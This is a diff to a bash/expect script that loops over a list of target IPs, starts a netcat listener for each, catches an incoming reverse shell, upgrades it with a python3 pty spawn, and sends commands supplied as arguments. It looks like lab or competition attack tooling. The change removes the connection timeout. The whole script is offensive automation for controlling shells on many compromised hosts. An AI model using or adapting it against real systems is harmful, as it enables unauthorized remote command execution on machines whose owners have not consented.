@@ -2,7 +2,6 @@
 trap 'echo "Interrupted"; exit 1' INT
 
 BASE_PORT=1000
-TIMEOUT=6
 HOST="192.168.13.104"
 TARGETS=(
 "10.1.1.10" "10.2.1.10" "10.3.1.10" "10.4.1.10" "10.5.1.10" "10.6.1.10" "10.7.1.10" "10.8.1.10" "10.9.1.10" "10.10.1.10" "10.11.1.10" "10.12.1.10" "10.13.1.10" 
@@ -24,12 +23,8 @@ for TARGET in "${TARGETS[@]}"; do
     echo "[$TARGET] Connecting over port $PORT"
 
 expect << EOF
-set timeout $TIMEOUT
 spawn nc -lvnp $PORT
-expect {
-    -re "\[#\$\] " { set timeout -1 }
-    timeout { puts "[$TARGET] No connection"; exit 0 }
-}
+expect -re "\[#\$\] "
 send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
 $(for cmd in "$@"; do
     echo "expect -re \"\[#\$\] \""
